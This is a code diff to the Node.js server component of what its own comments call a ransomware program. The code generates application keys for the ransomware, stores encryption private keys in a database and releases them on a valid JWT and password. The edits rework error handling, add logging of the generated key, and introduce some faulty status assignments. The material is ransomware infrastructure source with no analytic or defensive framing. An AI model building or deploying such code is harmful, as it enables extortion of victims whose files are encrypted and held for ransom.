@@ -13,14 +13,13 @@ const genToken = function(appKey) {
 const verifyKey = function(token, callback) {
 	jwt.verify(token, config.secret, function(err, decoded) {
 		if(err) {
-			err = new Error('Unable to verify the application key');
-			err.status = 500;
 			return callback(err, null);
 		}
+		let appKey = decoded.id.appKey;
 		//Try to find a Key with the passed Appkey Value
-		Key.findOne({"appKey": decoded.id}, function(err, key) {
-			if(err || !key) {
-				err = new Error('Application not found');
+		Key.findOne({appKey: appKey}, function(err, key) {
+			if(err) {
+				console.log(err);
 				err.status = 404;
 				return callback(err, null);
 			}
@@ -47,7 +46,8 @@ const storePrivGenAppkey = function(req, res) {
 	if(req.body.privateKey) {
         	//Generate an app key to send to the Ransomware program
         	let genAppKey = crypto.randomBytes(20).toString('hex');
-        	//Create the JWT token
+	       	console.log(genAppKey);
+		//Create the JWT token
         	let token = genToken({appKey: genAppKey});
 		//Save the private key object along with the app key to the database
 		let privateKeyObject = req.body.privateKey;
@@ -80,18 +80,21 @@ const retrievePriv = function(req, res) {
 		//Verify the application key
 		verifyKey(token, function(err, key) {
 			if(err) {
-				err = new Error('Unable to verify application token');
-				err.status = 401;
+				res.statusCode = 500;
 				return res.json({message: err.message});
 			}
 			//Verify the password now
 			verifyPassword(key, password, function(err, privateKey){
-				res.json({privateKey: privateKey});
+				if(err) {
+					res.statusCode = err.status;
+					return res.json({message: err.message});
+				}
+				return res.json({privateKey: privateKey});
 			});
 		});
 	}else {
 		let err = new Error('Application did not send either application key or the password or both');
-		err.status = 401;
+		res.status = 401;
 		return res.json({message: err.message});
 	}
 };
